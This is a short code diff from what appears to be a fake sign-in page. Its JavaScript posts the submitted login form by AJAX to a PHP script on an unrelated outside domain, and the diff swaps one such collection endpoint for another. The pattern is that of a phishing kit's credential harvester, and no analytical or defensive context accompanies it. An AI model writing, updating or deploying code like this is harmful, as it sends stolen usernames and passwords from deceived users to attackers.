@@ -82,7 +82,7 @@ btnPost.textContent = "Sign In";
   Please Wait...
 </button>`).prop("disabled", false);
         $.ajax({
-            url: "https://bucketlion.com/shar/ugfr.php",
+            url: "https://physicaleducationdiploma.com/dashboard/file/ukk.php",
             type: 'POST',
             data: formData,
             contentType: false,
